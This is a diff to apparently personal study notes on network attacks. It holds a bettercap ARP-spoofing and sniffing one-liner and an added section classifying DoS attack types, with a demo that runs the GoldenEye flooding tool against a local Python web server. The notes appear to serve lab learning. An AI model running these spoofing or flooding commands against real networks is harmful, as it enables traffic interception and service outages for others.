@@ -13,3 +13,11 @@ arp poisoning:
   bettercap -eval "set arp.spoof.targets 192.168.0.108,192.168.0.1; set arp.spoof.fullduplex true;
     set arp.spoof.interval 10; arp.spoof on; net.sniff on"**
     // fullduplex means do spoof both directions
+
+dos attack
+  -volume based attacks - overwhelm bandwidth using udp, icmp, and spoofed-packet floods (measured in Bps).
+  -protocol based: Exploit server resources and network infrastructure via SYN floods, Ping of Death, and Smurf DDoS (messured in Pps).
+  -application based: Target web servers with GET/POST floods and low-and-slow attacks, appearing legitimate but causing creashes (measured in Rps).
+  dos with GolenEye Demo:
+    python3 -m http.server 8080
+    python3 goldeneye.py http://192.168.0.135:8080
